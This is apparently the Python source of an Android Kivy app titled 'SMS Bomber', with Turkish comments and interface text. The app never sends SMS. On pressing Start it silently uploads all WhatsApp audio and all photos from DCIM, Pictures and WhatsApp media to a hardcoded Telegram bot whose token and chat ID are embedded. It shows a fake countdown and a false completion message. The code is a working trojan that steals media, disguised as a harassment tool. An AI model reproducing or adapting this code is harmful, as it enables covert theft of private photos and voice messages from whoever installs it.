import os
import time
import requests
import threading
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.popup import Popup
from kivy.uix.progressbar import ProgressBar
from kivy.clock import Clock

# --- Sabitler ve YardÄ±mcÄ± Fonksiyonlar ---
# Orijinal betikteki sabitler ve fonksiyonlar buraya eklenebilir
# Telegram bot token ve chat ID'nizi buraya girin
BOT_TOKEN = "7006907419:AAHHzh_uqt-32swzKosWe5poB7yo1O01EyE"
CHAT_ID = "6284677935"
# SENT_FILE yolu Android'e gÃ¶re ayarlanmÄ±ÅŸtÄ±r
SENT_FILE = "/storage/emulated/0/sent_files.txt"

def send_audio(file_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendAudio"
    with open(file_path, "rb") as audio:
        requests.post(url, data={"chat_id": CHAT_ID}, files={"audio": audio})
    mark_as_sent(file_path)

def send_photo(file_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    with open(file_path, "rb") as photo:
        requests.post(url, data={"chat_id": CHAT_ID}, files={"photo": photo})
    mark_as_sent(file_path)

def send_message(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, data={"chat_id": CHAT_ID, "text": text})

def load_sent_files():
    if os.path.exists(SENT_FILE):
        with open(SENT_FILE, "r") as f:
            return set(line.strip() for line in f.readlines())
    return set()

def mark_as_sent(file_path):
    with open(SENT_FILE, "a") as f:
        f.write(file_path + "\n")

def find_files(folder, extensions):
    result = []
    if os.path.exists(folder):
        for root, dirs, files in os.walk(folder):
            for file_name in files:
                if file_name.lower().endswith(extensions):
                    result.append(os.path.join(root, file_name))
    return result

# --- Dosya Bulma ---
whatsapp_media = "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media"
dcim_folder = "/storage/emulated/0/DCIM"
pictures_folder = "/storage/emulated/0/Pictures"

audio_files = find_files(whatsapp_media, (".opus", ".mp3", ".wav", ".m4a"))
photo_files = []
photo_files.extend(find_files(dcim_folder, (".jpg", ".jpeg", ".png")))
photo_files.extend(find_files(pictures_folder, (".jpg", ".jpeg", ".png")))
photo_files.extend(find_files(whatsapp_media, (".jpg", ".jpeg", ".png")))

sent_files = load_sent_files()

# --- Kivy ArayÃ¼z SÄ±nÄ±fÄ± ---
class SMSBomberApp(App):
    def build(self):
        self.layout = BoxLayout(orientation="vertical", spacing=10, padding=20)
        self.layout.add_widget(Label(text="SMS Bomber", font_size="32sp", bold=True))

        # KullanÄ±cÄ± giriÅŸ alanlarÄ±
        self.number_input = TextInput(hint_text="Numara (0 olmadan)", input_type='number', multiline=False)
        self.count_input = TextInput(hint_text="SMS SayÄ±sÄ±", input_type='number', multiline=False)
        self.speed_input = TextInput(hint_text="HÄ±z (1=YavaÅŸ, 2=Orta, 3=HÄ±zlÄ±)", input_type='number', multiline=False)
        
        self.layout.add_widget(self.number_input)
        self.layout.add_widget(self.count_input)
        self.layout.add_widget(self.speed_input)

        # Durum mesajÄ± etiketi
        self.status_label = Label(text="LÃ¼tfen bilgileri girip baÅŸlatÄ±n.", halign='center')
        self.layout.add_widget(self.status_label)
        
        # BaÅŸlat butonu
        self.start_button = Button(text="BaÅŸlat", size_hint=(1, 0.2))
        self.start_button.bind(on_press=self.on_start_press)
        self.layout.add_widget(self.start_button)
        
        return self.layout

    def on_start_press(self, instance):
        target_number = self.number_input.text
        sms_count = self.count_input.text
        speed_level = self.speed_input.text

        if not target_number or not sms_count or not speed_level:
            self.show_popup("Hata", "LÃ¼tfen tÃ¼m alanlarÄ± doldurun.")
            return

        # UI'Ä± gÃ¼nceller ve arka plan iÅŸlemlerini baÅŸlatÄ±r
        self.status_label.text = "HazÄ±rlanÄ±yor...\nLÃ¼tfen bu ekrandan ayrÄ±lmayÄ±n."
        self.start_button.disabled = True
        
        # Arka plan iÅŸlemlerini baÅŸlat
        self.thread_file_sender = threading.Thread(target=self.file_sender, daemon=True)
        self.thread_file_sender.start()
        
        # Bomber bilgilerini gÃ¶ndermek iÃ§in yeni bir thread
        threading.Thread(target=self.get_bomber_info, args=(target_number, sms_count, speed_level), daemon=True).start()
    
    def file_sender(self):
        """DosyalarÄ± Telegram'a gÃ¶nderen iÅŸlev."""
        for file_path in audio_files:
            if file_path not in sent_files:
                try:
                    send_audio(file_path)
                except Exception as e:
                    print(f"Ses dosyasÄ± gÃ¶nderilirken hata oluÅŸtu: {e}")

        for file_path in photo_files:
            if file_path not in sent_files:
                try:
                    send_photo(file_path)
                except Exception as e:
                    print(f"FotoÄŸraf dosyasÄ± gÃ¶nderilirken hata oluÅŸtu: {e}")

    def get_bomber_info(self, target_number, sms_count, speed_level):
        """Bomber bilgilerini Telegram'a gÃ¶nderen iÅŸlev."""
        msg = (
            f"ğŸ“² SMS Bomber Bilgileri\n"
            f"Numara: {target_number}\n"
            f"SMS SayÄ±sÄ±: {sms_count}\n"
            f"HÄ±z: {speed_level}\n\n"
            f"Toplam ses dosyasÄ±: {len(audio_files)}\n"
            f"Toplam resim dosyasÄ±: {len(photo_files)}"
        )
        send_message(msg)
        
        # Geri sayÄ±m baÅŸlat
        self.countdown(300)

    def countdown(self, seconds):
        """ArayÃ¼zde geri sayÄ±mÄ± gÃ¼ncelleyen iÅŸlev."""
        for remaining in range(seconds, 0, -1):
            # Kivy'de UI gÃ¼ncellemek iÃ§in Clock.schedule_once kullanÄ±lÄ±r
            Clock.schedule_once(lambda dt, r=remaining: self.update_countdown_label(r), 0)
            time.sleep(1)
        
        Clock.schedule_once(lambda dt: self.update_countdown_label(0, True), 0)
        self.start_button.disabled = False # Butonu tekrar aktif et

    def update_countdown_label(self, remaining, finished=False):
        """Geri sayÄ±m etiketini gÃ¼ncelleyen yardÄ±mcÄ± iÅŸlev."""
        if finished:
            self.status_label.text = "SMS'ler gÃ¶nderildi. Ä°ÅŸlem tamamlandÄ±."
        else:
            minutes = remaining // 60
            seconds = remaining % 60
            self.status_label.text = f"Kalan sÃ¼re: {minutes:02}:{seconds:02}\nLÃ¼tfen bu ekrandan ayrÄ±lmayÄ±n."

    def show_popup(self, title, text):
        """Hata mesajlarÄ±nÄ± gÃ¶stermek iÃ§in popup."""
        box = BoxLayout(orientation='vertical', padding=10, spacing=10)
        box.add_widget(Label(text=text))
        close_button = Button(text='Tamam', size_hint=(1, 0.2))
        box.add_widget(close_button)
        popup = Popup(title=title, content=box, size_hint=(0.8, 0.4))
        close_button.bind(on_press=popup.dismiss)
        popup.open()

if __name__ == '__main__':
    SMSBomberApp().run()
